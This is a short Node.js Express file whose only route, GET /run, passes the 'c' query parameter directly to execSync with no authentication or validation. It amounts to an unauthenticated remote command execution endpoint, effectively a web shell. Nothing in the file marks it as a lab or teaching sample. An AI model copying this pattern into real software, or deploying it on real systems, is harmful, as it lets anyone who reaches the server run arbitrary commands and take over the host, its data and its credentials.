const express = require('express');
const { execSync } = require('child_process');
const app = express();

function run(cmd) {
  return execSync(cmd);
}

app.get('/run', (req, res) => {
  run(req.query.c);
  res.send('ok');
});
